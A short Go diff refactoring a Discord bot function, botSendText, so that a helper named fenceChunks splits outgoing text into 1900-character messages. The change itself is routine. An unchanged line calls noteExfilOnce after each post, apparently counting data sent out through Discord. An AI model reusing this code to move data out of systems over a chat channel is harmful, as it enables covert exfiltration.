@@ -476,15 +476,7 @@ func botSendText(channel, s string) {
 		return
 	}
 	s = strings.TrimSpace(s)
-	for len(s) > 0 {
-		chunk := s
-		if len(chunk) > 1900 {
-			cut := strings.LastIndex(chunk[:1900], "\n")
-			if cut < 400 {
-				cut = 1900
-			}
-			chunk = chunk[:cut]
-		}
+	for _, chunk := range fenceChunks(s, 1900) {
 		code, err := discordPost(fmt.Sprintf("/channels/%s/messages", channel),
 			map[string]string{"content": chunk})
 		if err != nil {
@@ -496,8 +488,6 @@ func botSendText(channel, s string) {
 			return
 		}
 		noteExfilOnce(len(chunk))
-		s = s[len(chunk):]
-		s = strings.TrimLeft(s, "\r\n")
 		time.Sleep(350 * time.Millisecond) // limite de débit Discord
 	}
 }
